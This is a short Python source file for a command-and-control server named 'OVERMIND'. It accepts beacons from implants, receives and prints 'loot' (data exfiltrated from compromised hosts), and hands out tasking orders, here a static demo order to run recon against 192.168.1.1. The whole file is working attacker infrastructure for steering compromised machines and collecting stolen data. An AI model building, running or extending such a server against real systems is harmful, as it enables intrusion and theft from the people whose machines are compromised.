from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import threading
from rich.console import Console

console = Console()

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/beacon':
            self._handle_beacon()
        elif self.path == '/loot':
            self._handle_loot()
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/orders':
            self._handle_orders()
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_beacon(self):
        length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(length))
        console.print(f"[OVERMIND] 📡 Beacon from {data['id']} (Status: {data['status']})")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ACK')

    def _handle_loot(self):
        length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(length))
        console.print(f"[OVERMIND] 💰 Loot Received from {data['id']}: {data['content']}")
        self.send_response(200)
        self.end_headers()

    def _handle_orders(self):
        # Static orders for demo
        orders = {"task": "recon", "target": "192.168.1.1"}
        self.send_response(200)
        self.end_headers()
        self.wfile.write(json.dumps(orders).encode())

class OvermindServer:
    def __init__(self, port=8080):
        self.port = port
        self.server = HTTPServer(('0.0.0.0', port), C2Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self):
        console.print(f"[OVERMIND] 👁️ C2 Server Online on port {self.port}")
        self.thread.start()

    def stop(self):
        self.server.shutdown()
